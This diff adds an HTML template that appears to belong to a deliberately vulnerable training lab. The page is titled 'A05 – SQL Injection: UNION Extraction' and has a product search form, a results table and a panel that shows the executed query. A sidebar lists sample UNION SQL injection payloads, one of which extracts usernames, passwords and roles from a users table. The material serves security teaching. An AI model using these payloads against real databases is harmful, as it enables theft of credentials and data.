@@ -1,0 +1,56 @@
+{% extends "base.html" %}
+{% block title %}A05 – SQLi Search{% endblock %}
+{% block content %}
+<h4><a href="/a05/">A05</a> — SQL Injection: UNION Extraction</h4>
+<div class="row">
+  <div class="col-md-5">
+    <div class="card mb-3">
+      <div class="card-body">
+        <form method="post">
+          <label class="form-label">Search Products</label>
+          <input name="term" class="form-control font-monospace mb-2"
+                 value="{{ request.form.get('term','') }}" placeholder="Laptop">
+          <button class="btn btn-danger w-100">Search</button>
+        </form>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-header text-danger small">UNION payloads</div>
+      <div class="card-body">
+        <pre class="small">' UNION SELECT id,username,password,role
+FROM a05_users--
+
+' UNION SELECT 1,name,price,category
+FROM a05_products WHERE 1=1--</pre>
+      </div>
+    </div>
+  </div>
+  <div class="col-md-7">
+    {% if query %}
+    <div class="card mb-3">
+      <div class="card-header text-secondary small">Query Executed</div>
+      <div class="card-body"><pre class="small">{{ query }}</pre></div>
+    </div>
+    {% endif %}
+    {% if products %}
+    <div class="card">
+      <div class="card-body p-0">
+        <table class="table table-dark table-sm mb-0">
+          <thead><tr><th>Col1</th><th>Col2</th><th>Col3</th><th>Col4</th></tr></thead>
+          <tbody>
+            {% for p in products %}
+            <tr>
+              <td>{{ p[0] }}</td>
+              <td class="text-warning">{{ p[1] }}</td>
+              <td>{{ p[2] }}</td>
+              <td>{{ p[3] }}</td>
+            </tr>
+            {% endfor %}
+          </tbody>
+        </table>
+      </div>
+    </div>
+    {% endif %}
+  </div>
+</div>
+{% endblock %}
